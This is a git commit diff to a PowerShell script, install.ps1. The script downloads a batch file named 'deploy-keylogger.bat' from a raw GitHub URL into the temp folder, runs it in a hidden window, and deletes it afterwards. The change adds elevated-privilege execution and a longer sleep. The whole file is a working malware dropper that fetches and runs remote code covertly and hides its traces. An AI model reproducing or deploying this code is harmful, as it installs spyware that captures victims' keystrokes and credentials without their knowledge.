60b085089e2614bd34dcea67db609c74b6ac93f9
Zhuss1 <106868616+Zhuss1@users.noreply.github.com>
2025-10-29 11:56:46 +0000

    Update install.ps1
    Updated script to run the batch file with elevated privileges and increased sleep duration.

--- install.ps1
+++ install.ps1
@@ -1,6 +1,6 @@
 $url="https://raw.githubusercontent.com/Zhuss1/main/main/deploy-keylogger.bat"
 $bat="$env:TEMP\kl.bat"
 iwr $url -OutFile $bat -UseBasicParsing
-Start-Process cmd -ArgumentList "/c $bat" -WindowStyle Hidden
-Start-Sleep 3
+Start-Process cmd -ArgumentList "/c `"$bat`"" -WindowStyle Hidden -Verb RunAs
+Start-Sleep 5
 Remove-Item $bat -ErrorAction SilentlyContinue
